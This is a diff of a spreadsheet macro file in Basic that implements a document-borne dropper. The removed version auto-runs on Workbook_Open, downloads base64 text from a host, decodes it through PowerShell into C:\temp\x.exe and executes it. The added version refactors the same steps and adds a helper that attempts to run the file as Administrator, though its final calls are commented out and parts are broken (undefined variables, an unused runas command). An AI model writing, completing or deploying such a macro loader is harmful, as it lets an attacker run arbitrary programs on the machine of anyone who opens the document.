@@ -46,90 +46,32 @@ Function DownloadWebContent(url As String) As String
     DownloadWebContent = result
 End Function
 
-Sub OpenFile()
-    Dim ProgramPath As String
-    ProgramPath = "C:\temp\x.exe" ' Path to the program
-    Shell(ProgramPath, 1)
+Sub SaveBase64ToExeFile()
+	Dim psCommand As String
+	
+	psCommand = "powershell -command ""[IO.File]::WriteAllBytes('" & filePath & "', [Convert]::FromBase64String('" & base64String & "'))"""
+	 
+	Shell(psCommand,1)
 End Sub
 
-Sub RunPowerShellUsingShell(psCommand As String)
-    ' Run the command
-    Shell(psCommand, 1)
+Sub RunExecutable(filePath As String)
+	Shell(filePath, 1)
 End Sub
 
-Sub SaveHTMLToCells(mystr As String)
-    Dim htmlLines() As String
-    Dim i As Long
-    Dim oSheet As Object
-    oSheet = ThisComponent.Sheets(0)
-
-    ' Split the HTML content by "<" to get each tag
-    htmlLines = Split(mystr, "<")
-
-    ' Write each tag to a new cell in the active worksheet
-    For i = LBound(htmlLines) To UBound(htmlLines)
-        If htmlLines(i) <> "" Then
-            oSheet.getCellByPosition(0, i).String = "<" & htmlLines(i)
-        End If
-    Next i
+Sub RunAsAdmin(filePath As String)
+	Dim command As String
+	command = "cmd.exe /C start ""RunAsAdmin"" /runas /user:Administrator """ & filePath & """"
+	Shell(filePath, 1)
 End Sub
 
 Sub MainSub()
     Dim mystr As String
     Dim myHost As String
     Dim comm As String
+    Dim fPath As String
+    fPath = "C:\temp\x.exe"
     myHost = "http://127.0.0.1/base64.txt"
     mystr = DownloadWebContent(myHost)
-    comm = "powershell -command ""[IO.File]::WriteAllBytes(""C:\temp\x.exe"", [Convert]::FromBase64String(" & mystr & "))"""
-    SaveHTMLToCells(mystr)
-    RunPowerShellUsingShell(comm)
-    OpenFile
+    'SaveBase64ToExeFile(mystr,fPath) 
+    'RunExecutable(comm)
 End Sub
-
-Sub Workbook_Open()
-    MainSub
-End Sub
-Sub SaveBase64ToFile(base64String As String, filePath As String)
-    Dim oSimpleFileAccess As Object
-    Dim oOutputStream As Object
-    Dim decodedBytes() As Byte
-
-    ' Decode the Base64 string
-    decodedBytes = DecodeBase64(base64String)
-
-    ' Create the SimpleFileAccess service
-    oSimpleFileAccess = CreateUnoService("com.sun.star.ucb.SimpleFileAccess")
-
-    ' Create an output stream to write the file
-    oOutputStream = oSimpleFileAccess.openFileWrite(filePath)
-
-    ' Write the decoded bytes to the file
-    oOutputStream.writeBytes(decodedBytes)
-
-    ' Close the output stream
-    oOutputStream.closeOutput()
-End Sub
-
-Function DecodeBase64(base64String As String) As Byte()
-    Dim oStringInputStream As Object
-    Dim oBase64DecodingStream As Object
-    Dim buffer(8191) As Byte
-    Dim bytesRead As Long
-    Dim result() As Byte
-
-    ' Create a StringInputStream with the Base64 string
-    oStringInputStream = CreateUnoService("com.sun.star.io.StringInputStream")
-    oStringInputStream.setString(base64String)
-
-    ' Create a Base64DecodingStream to decode the Base64 string
-    oBase64DecodingStream = CreateUnoService("com.sun.star.io.Base64DecodingStream")
-    oBase64DecodingStream.setInputStream(oStringInputStream)
-
-    ' Read the decoded bytes from the Base64DecodingStream
-    bytesRead = oBase64DecodingStream.readBytes(buffer(), UBound(buffer) + 1)
-    result = buffer()
-    ReDim Preserve result(bytesRead - 1)
-
-    ' Return the decoded bytes
-    DecodeBase64 = result
-End Function
